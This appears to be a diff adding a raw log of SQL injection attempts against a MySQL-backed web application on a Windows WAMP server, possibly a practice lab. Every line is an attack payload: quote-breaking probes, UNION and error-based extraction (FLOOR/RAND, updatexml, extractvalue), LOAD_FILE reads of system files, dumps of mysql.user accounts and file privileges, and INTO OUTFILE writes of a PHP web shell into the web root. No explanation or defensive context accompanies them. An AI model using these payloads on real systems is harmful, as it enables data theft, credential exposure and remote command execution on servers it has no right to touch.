@@ -1,0 +1,44 @@
+ID:1
+ID:1\
+ID:5
+ID:5
+ID:5"
+ID:5"-- 
+ID:5)"-- 
+ID:5")-- 
+ID:0") UNION SELECT 1,1,1-- 
+ID:0") UNION SELECT 1,1,1
+ID:0") UNION SELECT 1,1,1-- 
+ID:0") UNION SELECT 1,1,1-- 
+ID:1") UNION SELECT 1,1,1-- 
+ID:1") UNION SELECT 1,1,1-- 
+ID:1
+ID:1
+ID:6
+ID:1" OR 1=1-- 
+ID:1") OR 1=1-- 
+ID:1") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT database()), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y)-- 
+ID:1") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y)-- 
+ID:1") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1,2 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT load_file('C:////Windows////win.ini')), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*) CONCAT(0x7e,(SELECT load_file('C:////Windows////win.ini')),0x7e) FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x LIMIT 1) y)-- 
+ID:0") AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT LOAD_FILE('C:/Windows/win.ini')),0x7e,FLOOR(RAND(0)*2))AS x FROM information_schema.tables GROUP BY x LIMIT 1)y)-- 
+ID:0") UNION SELECT LOAD_FILE('C:')-- 
+ID:0") UNION SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini'),1-- 
+ID:0") UNION SELECT LOAD_FILE('C:\\\\Windows\\\\win.ini'),1,1-- 
+ID:0") UNION SELECT 1,LOAD_FILE('C:\\\\Windows\\\\win.ini'),1-- 
+ID:4") UNION SELECT "<?php system($_GET['cmd']); ?>",1,1 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:4") UNION SELECT "<?php system($_GET['cmd']); ?>",1,1 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:4") UNION SELECT "<?php system($_GET['cmd']); ?>",1,1 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:1' UNION SELECT 1,1,GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user-- 
+ID:0' UNION SELECT 1,1,GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user-- 
+ID:0' or updatexml(1,(select GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),1)-- 
+ID:1' and updatexml(1,concat(0x7e,(select user from mysql.user limit 0,1),0x7e),1)-- 
+ID:0' and updatexml(1,concat(0x7e,(select user from mysql.user limit 0,1),0x7e),1)-- 
+ID:0' and updatexml(1,concat(0x7e,(select user from mysql.user limit 0,1),0x7e),1)-- 
+ID:1' or updatexml(1,concat(version()),1)
+ID:1") and (extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user))))-- 
